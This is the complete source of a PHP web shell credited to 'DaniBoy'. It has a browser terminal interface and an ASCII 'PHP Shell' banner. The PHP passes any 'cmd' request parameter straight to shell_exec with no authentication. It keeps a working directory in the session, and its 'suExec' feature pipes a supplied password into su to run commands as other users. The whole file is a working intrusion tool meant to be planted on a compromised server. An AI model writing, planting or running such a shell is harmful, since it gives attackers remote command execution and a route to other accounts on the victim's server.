<?php
    session_start();

    if (!$_SESSION['cwd']) {
        $_SESSION['cwd'] = getcwd();
    }

    $ip = $_SERVER["HTTP_HOST"];
    $cmd = $_GET['cmd'];
    $parse = explode(" ", $cmd);






    // c=
    if ($parse[0] == "cd") {
        if ($parse[1] != "..") {
            $cwdant = $_SESSION['cwd'];
            $rest = substr($parse[1], 0, 1);

            if ($rest != '/') {
                if (substr($_SESSION['cwd'], -1, 1) == '/') {
                    $cwdp = $_SESSION['cwd'].''.$parse[1];
                } else {
                    $cwdp = $_SESSION['cwd'].'/'.$parse[1];
                }
                $_SESSION['cwd'] = $cwdp;
            } else{
                $_SESSION['cwd'] = $parse[1];
            }




            $cwd = $_SESSION['cwd'];
            chdir($cwd);
            $pwd = getcwd();



            if ($pwd != $_SESSION['cwd']) {
                $response = "<pre type='error'>[!]ERROR: Directory '" . $_SESSION['cwd'] . "' not found or not permission</pre>";
                $_SESSION['cwd'] = $cwdant;
            } else {
                $pwd = getcwd();
                $response = "<pre type='output'>shell@$ip($pwd): $cmd</pre>";
            }



        } else {
            $cwd = $_SESSION['cwd'];
            $split = explode("/", $cwd, -1);
            $implo = implode("/", $split);
            if ($implo == "") {
                $_SESSION['cwd'] = '/';
                $response = "</pre?><pre type='output'>Directory: ".$_SESSION['cwd']."</pre>";
            } else {
                $_SESSION['cwd'] = $implo;
                $response = "</pre><pre type='output'>Directory: ".$_SESSION['cwd']."</pre>";
            }
        }




        header("Content-Type: application/json");
        echo json_encode(array("value"=>$response));
        die();

    } elseif ($parse[0] == "suExec") {

        $pwd = getcwd();

        if (in_array("-u", $parse)) {
            $Iuser = array_search("-u", $parse) + 1;
            $user = $parse[$Iuser];
        } else {
            $command = "";
        }


        if (in_array("-p", $parse)) {
            $Ipass = array_search("-p", $parse) + 1;
            $pass = $parse[$Ipass];
        } else {
            $command = "";
        }


        if (in_array("-c", $parse)) {
            $Icommand = array_search("-c", $parse) + 1;
 
            if (strpos($cmd, "'")) {
                $pattern = "/'([^']+)'/"; 
                preg_match($pattern, $cmd, $commandParse);
                $command = $commandParse[1];

            } elseif (strpos($cmd,'"')) {
                $pattern = '/"([^"]+)"/'; 
                preg_match($pattern, $cmd, $commandParse);
                $command = $commandParse[1];
            } else {
                $command = $parse[$Icommand];
            }


        } else {
            $command = "";
        }



        if (in_array("-h", $parse) or $cmd == "suExec") {
            $out = "  -u    pass the user\n  -p    pass the password\n  -c    pass the command for execution\n  -h    function for help\n\n            execution example: suExec -u user -p pass -c 'ls -la'";

        } else {
            $out = shell_exec("echo '".$pass."' | su ".$user." -c '".$command."'");
        }



        $response = "<pre type='output'>shell@".$ip."(".$pwd."): ".$cmd."</pre><pre type='output'>".$out."</pre>";


        header("Content-Type: application/json");
        echo json_encode(array("value"=>$response));
        die();


    } elseif ($cmd != "") {

        $cwd = $_SESSION['cwd'];
        chdir($cwd);
        $pwd = getcwd();

        $out = shell_exec($cmd);
        $response = "<pre type='output'>shell@".$ip."(".$pwd."): ".$cmd."</pre><pre type='output'>".$out."</pre>";


        header("Content-Type: application/json");
        echo json_encode(array("value"=>$response));
        die();
   }


    if (!$cmd) {
        session_destroy();
    }
?>

<style>
  body {
    background-color: #191970;
  }

  form[type='file'] {
    background-color: #2F4F4F;
    width: 100%;
    height: 10%;
    border: 5px solid gray;
    margin: 0;

  }

  a[type='git'] {
    color: #000000;
  }

  input[type='inputShell'] {
    font-size: 20;
    width: 100%;
    background-color: #11ffee00;;
    color: #00ff00;

  }

  div[type='boxIn'] {
    background-color: #2F4F4F;
    width: 60%;
    border: 5px solid gray;
    margin: 0;
  }



  pre[type='error'] {
    font-size: 15px;
    color: #ffff00;
  }

  pre[type='banner'] {
    color: #bfff00;
    line-height: 0.2;
  }

  div[type='box'] {
    overflow: scroll;
    background-color: #2F4F4F;
    width: 60%;
    height: 60%;
    border: 5px solid gray;
    margin: 0;
  }
  pre[type='output'] {
    font-size: 15px;
    color: #00ff00;
  }

  div[type='resp'] {
    text-align: left;
  }


</style>

<?php
    $ip = $_SERVER["HTTP_HOST"];
    echo "<title>$ip@shell</title>";
?>



<script>
    function fazerRequisicao() {
        var command = document.getElementById('command').value;
        var element = document.getElementById("box");

        if (command == "clear") {
            document.getElementById("resposta").innerHTML = "";
        } else {

            var xhttp = new XMLHttpRequest();

            xhttp.open("GET", "?cmd="+command, false);

            xhttp.send();

            document.getElementById("resposta").innerHTML += JSON.parse(xhttp.responseText).value;
            element.scrollTop = element.scrollHeight - element.clientHeight;

        }
    }
</script>


<center>
    <body>

        <pre type="banner">_________   ______ ______  _________ </pre>
        <pre type="banner">|     \  \  | |  | | |  |  |     \  \</pre>
        <pre type="banner">|     |  |  | |  | | |  |  |     |  |</pre>
        <pre type="banner">|  __/__/   | | ---| |  |  |  __/__/ </pre>
        <pre type="banner">| |  |      | | ---| |  |  | |  |    </pre>
        <pre type="banner">| |  |      | |  | | |  |  | |  |    </pre>
        <pre type="banner">|_|__|      |_|__| | |__|  |_|__|    </pre>


        <pre type="banner">  _______   ______ ______   __________   ______         ______       </pre>
        <pre type="banner"> / ____\_\  | |  | | |  |  /   ____\__\  | |  |         | |  |       </pre>
        <pre type="banner">| | |       | |  | | |  |  |  |_|_____   | |  |         | |  |       </pre>
        <pre type="banner">|  \----    | | ---| |  |  |  _____\__\  | |  |         | |  |       </pre>
        <pre type="banner"> \___ \ \   | | ---| |  |  |  | |        | |  |         | |  |       </pre>
        <pre type="banner">  ___\ \ \  | |  | | |  |  |  |_|_____   | |__|______   | |__|______ </pre>
        <pre type="banner"> /_____/_/  |_|__| | |__|  \_______\__\  \________\__\  \________\__\</pre><a type="git" href="https://github.com/DaniBoy-off"><h3>By DaniBoy</h3></a>

        <div type="box" id="box">
            <div type="resp" id="resposta"></div>
        </div>

        <div type="boxIn">
            <input type="inputShell" id="command" ></input>
        </div>
        <button hidden=hidden id="button" onclick="fazerRequisicao();">enter</button>


    </body>
</center>


<script>
    var input = document.getElementById("command");
    input.addEventListener("keyup", function(event) {
        if (event.keyCode === 13) {
            event.preventDefault();
            if (input.value != "") {
                document.getElementById("button").click();
                input.value = "";
            }
        }
    });
</script>
